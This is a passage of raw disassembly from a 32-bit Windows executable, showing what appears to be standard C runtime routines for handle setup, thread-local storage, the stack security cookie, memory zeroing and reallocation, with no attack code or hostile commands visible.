  406401:	eb 0a                	jmp    0x40640d
  406403:	8d 43 ff             	lea    -0x1(%ebx),%eax
  406406:	f7 d8                	neg    %eax
  406408:	1b c0                	sbb    %eax,%eax
  40640a:	83 c0 f5             	add    $0xfffffff5,%eax
  40640d:	50                   	push   %eax
  40640e:	ff 15 18 b1 40 00    	call   *0x40b118
  406414:	8b f8                	mov    %eax,%edi
  406416:	83 ff ff             	cmp    $0xffffffff,%edi
  406419:	74 42                	je     0x40645d
  40641b:	85 ff                	test   %edi,%edi
  40641d:	74 3e                	je     0x40645d
  40641f:	57                   	push   %edi
  406420:	ff 15 2c b1 40 00    	call   *0x40b12c
  406426:	85 c0                	test   %eax,%eax
  406428:	74 33                	je     0x40645d
  40642a:	25 ff 00 00 00       	and    $0xff,%eax
  40642f:	89 3e                	mov    %edi,(%esi)
  406431:	83 f8 02             	cmp    $0x2,%eax
  406434:	75 06                	jne    0x40643c
  406436:	80 4e 04 40          	orb    $0x40,0x4(%esi)
  40643a:	eb 09                	jmp    0x406445
  40643c:	83 f8 03             	cmp    $0x3,%eax
  40643f:	75 04                	jne    0x406445
  406441:	80 4e 04 08          	orb    $0x8,0x4(%esi)
  406445:	68 a0 0f 00 00       	push   $0xfa0
  40644a:	8d 46 0c             	lea    0xc(%esi),%eax
  40644d:	50                   	push   %eax
  40644e:	ff 15 90 b0 40 00    	call   *0x40b090
  406454:	85 c0                	test   %eax,%eax
  406456:	74 2c                	je     0x406484
  406458:	ff 46 08             	incl   0x8(%esi)
  40645b:	eb 0a                	jmp    0x406467
  40645d:	80 4e 04 40          	orb    $0x40,0x4(%esi)
  406461:	c7 06 fe ff ff ff    	movl   $0xfffffffe,(%esi)
  406467:	43                   	inc    %ebx
  406468:	83 fb 03             	cmp    $0x3,%ebx
  40646b:	0f 8c 68 ff ff ff    	jl     0x4063d9
  406471:	ff 35 04 16 41 00    	push   0x411604
  406477:	ff 15 28 b1 40 00    	call   *0x40b128
  40647d:	33 c0                	xor    %eax,%eax
  40647f:	5f                   	pop    %edi
  406480:	5b                   	pop    %ebx
  406481:	5e                   	pop    %esi
  406482:	c9                   	leave
  406483:	c3                   	ret
  406484:	83 c8 ff             	or     $0xffffffff,%eax
  406487:	eb f6                	jmp    0x40647f
  406489:	8b ff                	mov    %edi,%edi
  40648b:	56                   	push   %esi
  40648c:	b8 24 d7 40 00       	mov    $0x40d724,%eax
  406491:	be 24 d7 40 00       	mov    $0x40d724,%esi
  406496:	57                   	push   %edi
  406497:	8b f8                	mov    %eax,%edi
  406499:	3b c6                	cmp    %esi,%eax
  40649b:	73 0f                	jae    0x4064ac
  40649d:	8b 07                	mov    (%edi),%eax
  40649f:	85 c0                	test   %eax,%eax
  4064a1:	74 02                	je     0x4064a5
  4064a3:	ff d0                	call   *%eax
  4064a5:	83 c7 04             	add    $0x4,%edi
  4064a8:	3b fe                	cmp    %esi,%edi
  4064aa:	72 f1                	jb     0x40649d
  4064ac:	5f                   	pop    %edi
  4064ad:	5e                   	pop    %esi
  4064ae:	c3                   	ret
  4064af:	8b ff                	mov    %edi,%edi
  4064b1:	56                   	push   %esi
  4064b2:	b8 2c d7 40 00       	mov    $0x40d72c,%eax
  4064b7:	be 2c d7 40 00       	mov    $0x40d72c,%esi
  4064bc:	57                   	push   %edi
  4064bd:	8b f8                	mov    %eax,%edi
  4064bf:	3b c6                	cmp    %esi,%eax
  4064c1:	73 0f                	jae    0x4064d2
  4064c3:	8b 07                	mov    (%edi),%eax
  4064c5:	85 c0                	test   %eax,%eax
  4064c7:	74 02                	je     0x4064cb
  4064c9:	ff d0                	call   *%eax
  4064cb:	83 c7 04             	add    $0x4,%edi
  4064ce:	3b fe                	cmp    %esi,%edi
  4064d0:	72 f1                	jb     0x4064c3
  4064d2:	5f                   	pop    %edi
  4064d3:	5e                   	pop    %esi
  4064d4:	c3                   	ret
  4064d5:	6a 00                	push   $0x0
  4064d7:	ff 15 e4 b0 40 00    	call   *0x40b0e4
  4064dd:	c3                   	ret
  4064de:	ff 15 34 b1 40 00    	call   *0x40b134
  4064e4:	c2 04 00             	ret    $0x4
  4064e7:	8b ff                	mov    %edi,%edi
  4064e9:	56                   	push   %esi
  4064ea:	ff 35 0c f5 40 00    	push   0x40f50c
  4064f0:	ff 15 38 b1 40 00    	call   *0x40b138
  4064f6:	8b f0                	mov    %eax,%esi
  4064f8:	85 f6                	test   %esi,%esi
  4064fa:	75 1b                	jne    0x406517
  4064fc:	ff 35 e8 13 41 00    	push   0x4113e8
  406502:	ff 15 e8 b0 40 00    	call   *0x40b0e8
  406508:	8b f0                	mov    %eax,%esi
  40650a:	56                   	push   %esi
  40650b:	ff 35 0c f5 40 00    	push   0x40f50c
  406511:	ff 15 3c b1 40 00    	call   *0x40b13c
  406517:	8b c6                	mov    %esi,%eax
  406519:	5e                   	pop    %esi
  40651a:	c3                   	ret
  40651b:	a1 08 f5 40 00       	mov    0x40f508,%eax
  406520:	83 f8 ff             	cmp    $0xffffffff,%eax
  406523:	74 16                	je     0x40653b
  406525:	50                   	push   %eax
  406526:	ff 35 f0 13 41 00    	push   0x4113f0
  40652c:	ff 15 e8 b0 40 00    	call   *0x40b0e8
  406532:	ff d0                	call   *%eax
  406534:	83 0d 08 f5 40 00 ff 	orl    $0xffffffff,0x40f508
  40653b:	a1 0c f5 40 00       	mov    0x40f50c,%eax
  406540:	83 f8 ff             	cmp    $0xffffffff,%eax
  406543:	74 0e                	je     0x406553
  406545:	50                   	push   %eax
  406546:	ff 15 40 b1 40 00    	call   *0x40b140
  40654c:	83 0d 0c f5 40 00 ff 	orl    $0xffffffff,0x40f50c
  406553:	e9 63 06 00 00       	jmp    0x406bbb
  406558:	6a 08                	push   $0x8
  40655a:	68 d0 d8 40 00       	push   $0x40d8d0
  40655f:	e8 6c e5 ff ff       	call   0x404ad0
  406564:	68 70 be 40 00       	push   $0x40be70
  406569:	ff 15 58 b0 40 00    	call   *0x40b058
  40656f:	8b 75 08             	mov    0x8(%ebp),%esi
  406572:	c7 46 5c d0 bd 40 00 	movl   $0x40bdd0,0x5c(%esi)
  406579:	83 66 08 00          	andl   $0x0,0x8(%esi)
  40657d:	33 ff                	xor    %edi,%edi
  40657f:	47                   	inc    %edi
  406580:	89 7e 14             	mov    %edi,0x14(%esi)
  406583:	89 7e 70             	mov    %edi,0x70(%esi)
  406586:	c6 86 c8 00 00 00 43 	movb   $0x43,0xc8(%esi)
  40658d:	c6 86 4b 01 00 00 43 	movb   $0x43,0x14b(%esi)
  406594:	c7 46 68 70 f6 40 00 	movl   $0x40f670,0x68(%esi)
  40659b:	6a 0d                	push   $0xd
  40659d:	e8 49 07 00 00       	call   0x406ceb
  4065a2:	59                   	pop    %ecx
  4065a3:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4065a7:	ff 76 68             	push   0x68(%esi)
  4065aa:	ff 15 44 b1 40 00    	call   *0x40b144
  4065b0:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4065b7:	e8 3e 00 00 00       	call   0x4065fa
  4065bc:	6a 0c                	push   $0xc
  4065be:	e8 28 07 00 00       	call   0x406ceb
  4065c3:	59                   	pop    %ecx
  4065c4:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4065c7:	8b 45 0c             	mov    0xc(%ebp),%eax
  4065ca:	89 46 6c             	mov    %eax,0x6c(%esi)
  4065cd:	85 c0                	test   %eax,%eax
  4065cf:	75 08                	jne    0x4065d9
  4065d1:	a1 d8 fd 40 00       	mov    0x40fdd8,%eax
  4065d6:	89 46 6c             	mov    %eax,0x6c(%esi)
  4065d9:	ff 76 6c             	push   0x6c(%esi)
  4065dc:	e8 fc 19 00 00       	call   0x407fdd
  4065e1:	59                   	pop    %ecx
  4065e2:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4065e9:	e8 15 00 00 00       	call   0x406603
  4065ee:	e8 22 e5 ff ff       	call   0x404b15
  4065f3:	c3                   	ret
  4065f4:	33 ff                	xor    %edi,%edi
  4065f6:	47                   	inc    %edi
  4065f7:	8b 75 08             	mov    0x8(%ebp),%esi
  4065fa:	6a 0d                	push   $0xd
  4065fc:	e8 11 06 00 00       	call   0x406c12
  406601:	59                   	pop    %ecx
  406602:	c3                   	ret
  406603:	6a 0c                	push   $0xc
  406605:	e8 08 06 00 00       	call   0x406c12
  40660a:	59                   	pop    %ecx
  40660b:	c3                   	ret
  40660c:	8b ff                	mov    %edi,%edi
  40660e:	56                   	push   %esi
  40660f:	57                   	push   %edi
  406610:	ff 15 8c b0 40 00    	call   *0x40b08c
  406616:	ff 35 08 f5 40 00    	push   0x40f508
  40661c:	8b f8                	mov    %eax,%edi
  40661e:	e8 c4 fe ff ff       	call   0x4064e7
  406623:	ff d0                	call   *%eax
  406625:	8b f0                	mov    %eax,%esi
  406627:	85 f6                	test   %esi,%esi
  406629:	75 4e                	jne    0x406679
  40662b:	68 14 02 00 00       	push   $0x214
  406630:	6a 01                	push   $0x1
  406632:	e8 d3 e0 ff ff       	call   0x40470a
  406637:	8b f0                	mov    %eax,%esi
  406639:	59                   	pop    %ecx
  40663a:	59                   	pop    %ecx
  40663b:	85 f6                	test   %esi,%esi
  40663d:	74 3a                	je     0x406679
  40663f:	56                   	push   %esi
  406640:	ff 35 08 f5 40 00    	push   0x40f508
  406646:	ff 35 ec 13 41 00    	push   0x4113ec
  40664c:	ff 15 e8 b0 40 00    	call   *0x40b0e8
  406652:	ff d0                	call   *%eax
  406654:	85 c0                	test   %eax,%eax
  406656:	74 18                	je     0x406670
  406658:	6a 00                	push   $0x0
  40665a:	56                   	push   %esi
  40665b:	e8 f8 fe ff ff       	call   0x406558
  406660:	59                   	pop    %ecx
  406661:	59                   	pop    %ecx
  406662:	ff 15 4c b1 40 00    	call   *0x40b14c
  406668:	83 4e 04 ff          	orl    $0xffffffff,0x4(%esi)
  40666c:	89 06                	mov    %eax,(%esi)
  40666e:	eb 09                	jmp    0x406679
  406670:	56                   	push   %esi
  406671:	e8 35 d5 ff ff       	call   0x403bab
  406676:	59                   	pop    %ecx
  406677:	33 f6                	xor    %esi,%esi
  406679:	57                   	push   %edi
  40667a:	ff 15 48 b1 40 00    	call   *0x40b148
  406680:	5f                   	pop    %edi
  406681:	8b c6                	mov    %esi,%eax
  406683:	5e                   	pop    %esi
  406684:	c3                   	ret
  406685:	8b ff                	mov    %edi,%edi
  406687:	56                   	push   %esi
  406688:	e8 7f ff ff ff       	call   0x40660c
  40668d:	8b f0                	mov    %eax,%esi
  40668f:	85 f6                	test   %esi,%esi
  406691:	75 08                	jne    0x40669b
  406693:	6a 10                	push   $0x10
  406695:	e8 0a e4 ff ff       	call   0x404aa4
  40669a:	59                   	pop    %ecx
  40669b:	8b c6                	mov    %esi,%eax
  40669d:	5e                   	pop    %esi
  40669e:	c3                   	ret
  40669f:	6a 08                	push   $0x8
  4066a1:	68 f8 d8 40 00       	push   $0x40d8f8
  4066a6:	e8 25 e4 ff ff       	call   0x404ad0
  4066ab:	8b 75 08             	mov    0x8(%ebp),%esi
  4066ae:	85 f6                	test   %esi,%esi
  4066b0:	0f 84 f8 00 00 00    	je     0x4067ae
  4066b6:	8b 46 24             	mov    0x24(%esi),%eax
  4066b9:	85 c0                	test   %eax,%eax
  4066bb:	74 07                	je     0x4066c4
  4066bd:	50                   	push   %eax
  4066be:	e8 e8 d4 ff ff       	call   0x403bab
  4066c3:	59                   	pop    %ecx
  4066c4:	8b 46 2c             	mov    0x2c(%esi),%eax
  4066c7:	85 c0                	test   %eax,%eax
  4066c9:	74 07                	je     0x4066d2
  4066cb:	50                   	push   %eax
  4066cc:	e8 da d4 ff ff       	call   0x403bab
  4066d1:	59                   	pop    %ecx
  4066d2:	8b 46 34             	mov    0x34(%esi),%eax
  4066d5:	85 c0                	test   %eax,%eax
  4066d7:	74 07                	je     0x4066e0
  4066d9:	50                   	push   %eax
  4066da:	e8 cc d4 ff ff       	call   0x403bab
  4066df:	59                   	pop    %ecx
  4066e0:	8b 46 3c             	mov    0x3c(%esi),%eax
  4066e3:	85 c0                	test   %eax,%eax
  4066e5:	74 07                	je     0x4066ee
  4066e7:	50                   	push   %eax
  4066e8:	e8 be d4 ff ff       	call   0x403bab
  4066ed:	59                   	pop    %ecx
  4066ee:	8b 46 40             	mov    0x40(%esi),%eax
  4066f1:	85 c0                	test   %eax,%eax
  4066f3:	74 07                	je     0x4066fc
  4066f5:	50                   	push   %eax
  4066f6:	e8 b0 d4 ff ff       	call   0x403bab
  4066fb:	59                   	pop    %ecx
  4066fc:	8b 46 44             	mov    0x44(%esi),%eax
  4066ff:	85 c0                	test   %eax,%eax
  406701:	74 07                	je     0x40670a
  406703:	50                   	push   %eax
  406704:	e8 a2 d4 ff ff       	call   0x403bab
  406709:	59                   	pop    %ecx
  40670a:	8b 46 48             	mov    0x48(%esi),%eax
  40670d:	85 c0                	test   %eax,%eax
  40670f:	74 07                	je     0x406718
  406711:	50                   	push   %eax
  406712:	e8 94 d4 ff ff       	call   0x403bab
  406717:	59                   	pop    %ecx
  406718:	8b 46 5c             	mov    0x5c(%esi),%eax
  40671b:	3d d0 bd 40 00       	cmp    $0x40bdd0,%eax
  406720:	74 07                	je     0x406729
  406722:	50                   	push   %eax
  406723:	e8 83 d4 ff ff       	call   0x403bab
  406728:	59                   	pop    %ecx
  406729:	6a 0d                	push   $0xd
  40672b:	e8 bb 05 00 00       	call   0x406ceb
  406730:	59                   	pop    %ecx
  406731:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406735:	8b 7e 68             	mov    0x68(%esi),%edi
  406738:	85 ff                	test   %edi,%edi
  40673a:	74 1a                	je     0x406756
  40673c:	57                   	push   %edi
  40673d:	ff 15 50 b1 40 00    	call   *0x40b150
  406743:	85 c0                	test   %eax,%eax
  406745:	75 0f                	jne    0x406756
  406747:	81 ff 70 f6 40 00    	cmp    $0x40f670,%edi
  40674d:	74 07                	je     0x406756
  40674f:	57                   	push   %edi
  406750:	e8 56 d4 ff ff       	call   0x403bab
  406755:	59                   	pop    %ecx
  406756:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40675d:	e8 57 00 00 00       	call   0x4067b9
  406762:	6a 0c                	push   $0xc
  406764:	e8 82 05 00 00       	call   0x406ceb
  406769:	59                   	pop    %ecx
  40676a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  406771:	8b 7e 6c             	mov    0x6c(%esi),%edi
  406774:	85 ff                	test   %edi,%edi
  406776:	74 23                	je     0x40679b
  406778:	57                   	push   %edi
  406779:	e8 ee 18 00 00       	call   0x40806c
  40677e:	59                   	pop    %ecx
  40677f:	3b 3d d8 fd 40 00    	cmp    0x40fdd8,%edi
  406785:	74 14                	je     0x40679b
  406787:	81 ff 00 fd 40 00    	cmp    $0x40fd00,%edi
  40678d:	74 0c                	je     0x40679b
  40678f:	83 3f 00             	cmpl   $0x0,(%edi)
  406792:	75 07                	jne    0x40679b
  406794:	57                   	push   %edi
  406795:	e8 6b 19 00 00       	call   0x408105
  40679a:	59                   	pop    %ecx
  40679b:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4067a2:	e8 1e 00 00 00       	call   0x4067c5
  4067a7:	56                   	push   %esi
  4067a8:	e8 fe d3 ff ff       	call   0x403bab
  4067ad:	59                   	pop    %ecx
  4067ae:	e8 62 e3 ff ff       	call   0x404b15
  4067b3:	c2 04 00             	ret    $0x4
  4067b6:	8b 75 08             	mov    0x8(%ebp),%esi
  4067b9:	6a 0d                	push   $0xd
  4067bb:	e8 52 04 00 00       	call   0x406c12
  4067c0:	59                   	pop    %ecx
  4067c1:	c3                   	ret
  4067c2:	8b 75 08             	mov    0x8(%ebp),%esi
  4067c5:	6a 0c                	push   $0xc
  4067c7:	e8 46 04 00 00       	call   0x406c12
  4067cc:	59                   	pop    %ecx
  4067cd:	c3                   	ret
  4067ce:	8b ff                	mov    %edi,%edi
  4067d0:	57                   	push   %edi
  4067d1:	68 70 be 40 00       	push   $0x40be70
  4067d6:	ff 15 58 b0 40 00    	call   *0x40b058
  4067dc:	8b f8                	mov    %eax,%edi
  4067de:	85 ff                	test   %edi,%edi
  4067e0:	75 09                	jne    0x4067eb
  4067e2:	e8 34 fd ff ff       	call   0x40651b
  4067e7:	33 c0                	xor    %eax,%eax
  4067e9:	5f                   	pop    %edi
  4067ea:	c3                   	ret
  4067eb:	56                   	push   %esi
  4067ec:	8b 35 48 b0 40 00    	mov    0x40b048,%esi
  4067f2:	68 ac be 40 00       	push   $0x40beac
  4067f7:	57                   	push   %edi
  4067f8:	ff d6                	call   *%esi
  4067fa:	68 a0 be 40 00       	push   $0x40bea0
  4067ff:	57                   	push   %edi
  406800:	a3 e4 13 41 00       	mov    %eax,0x4113e4
  406805:	ff d6                	call   *%esi
  406807:	68 94 be 40 00       	push   $0x40be94
  40680c:	57                   	push   %edi
  40680d:	a3 e8 13 41 00       	mov    %eax,0x4113e8
  406812:	ff d6                	call   *%esi
  406814:	68 8c be 40 00       	push   $0x40be8c
  406819:	57                   	push   %edi
  40681a:	a3 ec 13 41 00       	mov    %eax,0x4113ec
  40681f:	ff d6                	call   *%esi
  406821:	83 3d e4 13 41 00 00 	cmpl   $0x0,0x4113e4
  406828:	8b 35 3c b1 40 00    	mov    0x40b13c,%esi
  40682e:	a3 f0 13 41 00       	mov    %eax,0x4113f0
  406833:	74 16                	je     0x40684b
  406835:	83 3d e8 13 41 00 00 	cmpl   $0x0,0x4113e8
  40683c:	74 0d                	je     0x40684b
  40683e:	83 3d ec 13 41 00 00 	cmpl   $0x0,0x4113ec
  406845:	74 04                	je     0x40684b
  406847:	85 c0                	test   %eax,%eax
  406849:	75 24                	jne    0x40686f
  40684b:	a1 38 b1 40 00       	mov    0x40b138,%eax
  406850:	a3 e8 13 41 00       	mov    %eax,0x4113e8
  406855:	a1 40 b1 40 00       	mov    0x40b140,%eax
  40685a:	c7 05 e4 13 41 00 de 	movl   $0x4064de,0x4113e4
  406861:	64 40 00 
  406864:	89 35 ec 13 41 00    	mov    %esi,0x4113ec
  40686a:	a3 f0 13 41 00       	mov    %eax,0x4113f0
  40686f:	ff 15 34 b1 40 00    	call   *0x40b134
  406875:	a3 0c f5 40 00       	mov    %eax,0x40f50c
  40687a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40687d:	0f 84 c1 00 00 00    	je     0x406944
  406883:	ff 35 e8 13 41 00    	push   0x4113e8
  406889:	50                   	push   %eax
  40688a:	ff d6                	call   *%esi
  40688c:	85 c0                	test   %eax,%eax
  40688e:	0f 84 b0 00 00 00    	je     0x406944
  406894:	e8 93 df ff ff       	call   0x40482c
  406899:	ff 35 e4 13 41 00    	push   0x4113e4
  40689f:	8b 35 e4 b0 40 00    	mov    0x40b0e4,%esi
  4068a5:	ff d6                	call   *%esi
  4068a7:	ff 35 e8 13 41 00    	push   0x4113e8
  4068ad:	a3 e4 13 41 00       	mov    %eax,0x4113e4
  4068b2:	ff d6                	call   *%esi
  4068b4:	ff 35 ec 13 41 00    	push   0x4113ec
  4068ba:	a3 e8 13 41 00       	mov    %eax,0x4113e8
  4068bf:	ff d6                	call   *%esi
  4068c1:	ff 35 f0 13 41 00    	push   0x4113f0
  4068c7:	a3 ec 13 41 00       	mov    %eax,0x4113ec
  4068cc:	ff d6                	call   *%esi
  4068ce:	a3 f0 13 41 00       	mov    %eax,0x4113f0
  4068d3:	e8 99 02 00 00       	call   0x406b71
  4068d8:	85 c0                	test   %eax,%eax
  4068da:	74 63                	je     0x40693f
  4068dc:	8b 3d e8 b0 40 00    	mov    0x40b0e8,%edi
  4068e2:	68 9f 66 40 00       	push   $0x40669f
  4068e7:	ff 35 e4 13 41 00    	push   0x4113e4
  4068ed:	ff d7                	call   *%edi
  4068ef:	ff d0                	call   *%eax
  4068f1:	a3 08 f5 40 00       	mov    %eax,0x40f508
  4068f6:	83 f8 ff             	cmp    $0xffffffff,%eax
  4068f9:	74 44                	je     0x40693f
  4068fb:	68 14 02 00 00       	push   $0x214
  406900:	6a 01                	push   $0x1
  406902:	e8 03 de ff ff       	call   0x40470a
  406907:	8b f0                	mov    %eax,%esi
  406909:	59                   	pop    %ecx
  40690a:	59                   	pop    %ecx
  40690b:	85 f6                	test   %esi,%esi
  40690d:	74 30                	je     0x40693f
  40690f:	56                   	push   %esi
  406910:	ff 35 08 f5 40 00    	push   0x40f508
  406916:	ff 35 ec 13 41 00    	push   0x4113ec
  40691c:	ff d7                	call   *%edi
  40691e:	ff d0                	call   *%eax
  406920:	85 c0                	test   %eax,%eax
  406922:	74 1b                	je     0x40693f
  406924:	6a 00                	push   $0x0
  406926:	56                   	push   %esi
  406927:	e8 2c fc ff ff       	call   0x406558
  40692c:	59                   	pop    %ecx
  40692d:	59                   	pop    %ecx
  40692e:	ff 15 4c b1 40 00    	call   *0x40b14c
  406934:	83 4e 04 ff          	orl    $0xffffffff,0x4(%esi)
  406938:	89 06                	mov    %eax,(%esi)
  40693a:	33 c0                	xor    %eax,%eax
  40693c:	40                   	inc    %eax
  40693d:	eb 07                	jmp    0x406946
  40693f:	e8 d7 fb ff ff       	call   0x40651b
  406944:	33 c0                	xor    %eax,%eax
  406946:	5e                   	pop    %esi
  406947:	5f                   	pop    %edi
  406948:	c3                   	ret
  406949:	6a 00                	push   $0x0
  40694b:	68 00 10 00 00       	push   $0x1000
  406950:	6a 00                	push   $0x0
  406952:	ff 15 54 b1 40 00    	call   *0x40b154
  406958:	33 c9                	xor    %ecx,%ecx
  40695a:	85 c0                	test   %eax,%eax
  40695c:	0f 95 c1             	setne  %cl
  40695f:	a3 f4 13 41 00       	mov    %eax,0x4113f4
  406964:	8b c1                	mov    %ecx,%eax
  406966:	c3                   	ret
  406967:	8b ff                	mov    %edi,%edi
  406969:	55                   	push   %ebp
  40696a:	8b ec                	mov    %esp,%ebp
  40696c:	83 ec 10             	sub    $0x10,%esp
  40696f:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  406974:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  406978:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40697c:	53                   	push   %ebx
  40697d:	57                   	push   %edi
  40697e:	bf 4e e6 40 bb       	mov    $0xbb40e64e,%edi
  406983:	bb 00 00 ff ff       	mov    $0xffff0000,%ebx
  406988:	3b c7                	cmp    %edi,%eax
  40698a:	74 0d                	je     0x406999
  40698c:	85 c3                	test   %eax,%ebx
  40698e:	74 09                	je     0x406999
  406990:	f7 d0                	not    %eax
  406992:	a3 b4 f0 40 00       	mov    %eax,0x40f0b4
  406997:	eb 65                	jmp    0x4069fe
  406999:	56                   	push   %esi
  40699a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40699d:	50                   	push   %eax
  40699e:	ff 15 64 b1 40 00    	call   *0x40b164
  4069a4:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4069a7:	33 75 f8             	xor    -0x8(%ebp),%esi
  4069aa:	ff 15 60 b1 40 00    	call   *0x40b160
  4069b0:	33 f0                	xor    %eax,%esi
  4069b2:	ff 15 4c b1 40 00    	call   *0x40b14c
  4069b8:	33 f0                	xor    %eax,%esi
  4069ba:	ff 15 5c b1 40 00    	call   *0x40b15c
  4069c0:	33 f0                	xor    %eax,%esi
  4069c2:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4069c5:	50                   	push   %eax
  4069c6:	ff 15 58 b1 40 00    	call   *0x40b158
  4069cc:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4069cf:	33 45 f0             	xor    -0x10(%ebp),%eax
  4069d2:	33 f0                	xor    %eax,%esi
  4069d4:	3b f7                	cmp    %edi,%esi
  4069d6:	75 07                	jne    0x4069df
  4069d8:	be 4f e6 40 bb       	mov    $0xbb40e64f,%esi
  4069dd:	eb 10                	jmp    0x4069ef
  4069df:	85 f3                	test   %esi,%ebx
  4069e1:	75 0c                	jne    0x4069ef
  4069e3:	8b c6                	mov    %esi,%eax
  4069e5:	0d 11 47 00 00       	or     $0x4711,%eax
  4069ea:	c1 e0 10             	shl    $0x10,%eax
  4069ed:	0b f0                	or     %eax,%esi
  4069ef:	89 35 b0 f0 40 00    	mov    %esi,0x40f0b0
  4069f5:	f7 d6                	not    %esi
  4069f7:	89 35 b4 f0 40 00    	mov    %esi,0x40f0b4
  4069fd:	5e                   	pop    %esi
  4069fe:	5f                   	pop    %edi
  4069ff:	5b                   	pop    %ebx
  406a00:	c9                   	leave
  406a01:	c3                   	ret
  406a02:	66 0f ef c0          	pxor   %xmm0,%xmm0
  406a06:	51                   	push   %ecx
  406a07:	53                   	push   %ebx
  406a08:	8b c1                	mov    %ecx,%eax
  406a0a:	83 e0 0f             	and    $0xf,%eax
  406a0d:	85 c0                	test   %eax,%eax
  406a0f:	75 7f                	jne    0x406a90
  406a11:	8b c2                	mov    %edx,%eax
  406a13:	83 e2 7f             	and    $0x7f,%edx
  406a16:	c1 e8 07             	shr    $0x7,%eax
  406a19:	74 37                	je     0x406a52
  406a1b:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  406a22:	66 0f 7f 01          	movdqa %xmm0,(%ecx)
  406a26:	66 0f 7f 41 10       	movdqa %xmm0,0x10(%ecx)
  406a2b:	66 0f 7f 41 20       	movdqa %xmm0,0x20(%ecx)
  406a30:	66 0f 7f 41 30       	movdqa %xmm0,0x30(%ecx)
  406a35:	66 0f 7f 41 40       	movdqa %xmm0,0x40(%ecx)
  406a3a:	66 0f 7f 41 50       	movdqa %xmm0,0x50(%ecx)
  406a3f:	66 0f 7f 41 60       	movdqa %xmm0,0x60(%ecx)
  406a44:	66 0f 7f 41 70       	movdqa %xmm0,0x70(%ecx)
  406a49:	8d 89 80 00 00 00    	lea    0x80(%ecx),%ecx
  406a4f:	48                   	dec    %eax
  406a50:	75 d0                	jne    0x406a22
  406a52:	85 d2                	test   %edx,%edx
  406a54:	74 37                	je     0x406a8d
  406a56:	8b c2                	mov    %edx,%eax
  406a58:	c1 e8 04             	shr    $0x4,%eax
  406a5b:	74 0f                	je     0x406a6c
  406a5d:	eb 03                	jmp    0x406a62
  406a5f:	8d 49 00             	lea    0x0(%ecx),%ecx
  406a62:	66 0f 7f 01          	movdqa %xmm0,(%ecx)
  406a66:	8d 49 10             	lea    0x10(%ecx),%ecx
  406a69:	48                   	dec    %eax
  406a6a:	75 f6                	jne    0x406a62
  406a6c:	83 e2 0f             	and    $0xf,%edx
  406a6f:	74 1c                	je     0x406a8d
  406a71:	8b c2                	mov    %edx,%eax
  406a73:	33 db                	xor    %ebx,%ebx
  406a75:	c1 ea 02             	shr    $0x2,%edx
  406a78:	74 08                	je     0x406a82
  406a7a:	89 19                	mov    %ebx,(%ecx)
  406a7c:	8d 49 04             	lea    0x4(%ecx),%ecx
  406a7f:	4a                   	dec    %edx
  406a80:	75 f8                	jne    0x406a7a
  406a82:	83 e0 03             	and    $0x3,%eax
  406a85:	74 06                	je     0x406a8d
  406a87:	88 19                	mov    %bl,(%ecx)
  406a89:	41                   	inc    %ecx
  406a8a:	48                   	dec    %eax
  406a8b:	75 fa                	jne    0x406a87
  406a8d:	5b                   	pop    %ebx
  406a8e:	58                   	pop    %eax
  406a8f:	c3                   	ret
  406a90:	8b d8                	mov    %eax,%ebx
  406a92:	f7 db                	neg    %ebx
  406a94:	83 c3 10             	add    $0x10,%ebx
  406a97:	2b d3                	sub    %ebx,%edx
  406a99:	33 c0                	xor    %eax,%eax
  406a9b:	52                   	push   %edx
  406a9c:	8b d3                	mov    %ebx,%edx
  406a9e:	83 e2 03             	and    $0x3,%edx
  406aa1:	74 06                	je     0x406aa9
  406aa3:	88 01                	mov    %al,(%ecx)
  406aa5:	41                   	inc    %ecx
  406aa6:	4a                   	dec    %edx
  406aa7:	75 fa                	jne    0x406aa3
  406aa9:	c1 eb 02             	shr    $0x2,%ebx
  406aac:	74 08                	je     0x406ab6
  406aae:	89 01                	mov    %eax,(%ecx)
  406ab0:	8d 49 04             	lea    0x4(%ecx),%ecx
  406ab3:	4b                   	dec    %ebx
  406ab4:	75 f8                	jne    0x406aae
  406ab6:	5a                   	pop    %edx
  406ab7:	e9 55 ff ff ff       	jmp    0x406a11
  406abc:	8b ff                	mov    %edi,%edi
  406abe:	55                   	push   %ebp
  406abf:	8b ec                	mov    %esp,%ebp
  406ac1:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  406ac5:	75 0b                	jne    0x406ad2
  406ac7:	ff 75 0c             	push   0xc(%ebp)
  406aca:	e8 88 d9 ff ff       	call   0x404457
  406acf:	59                   	pop    %ecx
  406ad0:	5d                   	pop    %ebp
  406ad1:	c3                   	ret
  406ad2:	56                   	push   %esi
  406ad3:	8b 75 0c             	mov    0xc(%ebp),%esi
  406ad6:	85 f6                	test   %esi,%esi
  406ad8:	75 0d                	jne    0x406ae7
  406ada:	ff 75 08             	push   0x8(%ebp)
  406add:	e8 c9 d0 ff ff       	call   0x403bab
  406ae2:	59                   	pop    %ecx
  406ae3:	33 c0                	xor    %eax,%eax
  406ae5:	eb 4d                	jmp    0x406b34
  406ae7:	57                   	push   %edi
  406ae8:	eb 30                	jmp    0x406b1a
  406aea:	85 f6                	test   %esi,%esi
  406aec:	75 01                	jne    0x406aef
  406aee:	46                   	inc    %esi
  406aef:	56                   	push   %esi
  406af0:	ff 75 08             	push   0x8(%ebp)
  406af3:	6a 00                	push   $0x0
  406af5:	ff 35 f4 13 41 00    	push   0x4113f4
  406afb:	ff 15 a4 b0 40 00    	call   *0x40b0a4
  406b01:	8b f8                	mov    %eax,%edi
  406b03:	85 ff                	test   %edi,%edi
  406b05:	75 5e                	jne    0x406b65
